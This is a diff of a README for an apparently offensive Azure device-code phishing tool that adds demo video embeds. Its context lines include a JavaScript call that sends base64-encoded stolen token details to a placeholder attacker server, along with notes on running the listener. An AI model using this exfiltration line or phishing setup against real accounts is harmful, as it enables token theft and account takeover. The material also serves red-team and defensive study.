@@ -57,6 +57,14 @@ Other way to use is to start the flask server which will listen for token detail
 >> start_server 1337 SSL  # can be run without SSL too
 ```
 
+#### Video Demo 1 (Normal Generate Token)
+
+<video width="640" height="480" controls>
+  <source src="videos/generate_device_code.mp4" type="video/mp4">
+  Your browser does not support the video tag.
+</video>
+
+
 ### Dynamic Device Code Phishing
 I don't need to explain what and how the device code phishing works. I would recommend reading this great [Blog Post](https://www.blackhillsinfosec.com/dynamic-device-code-phishing/) by [@rvrsh3ll](https://twitter.com/rvrsh3ll)
 I am using the same [index.html](https://github.com/rvrsh3ll/Azure-App-Tools/blob/master/DynamicDeviceCodes/index.html) except with small modification below. By default he's only sending the device_code to his python tool but our tool requires the complete token details which needs to be sent after base64 encoding.
@@ -80,6 +88,12 @@ document.getElementById('code').innerHTML += data.message;
 // Change this line to point to your listening webserver where the python code is running
 $.get("https://<Server Name>:<port>/start_session?tok=" + base64EncodedData);
 ```
+
+<video width="640" height="480" controls>
+  <source src="video/dynamic_device_code.mp4" type="video/mp4">
+  Your browser does not support the video tag.
+</video>
+
 
 
 
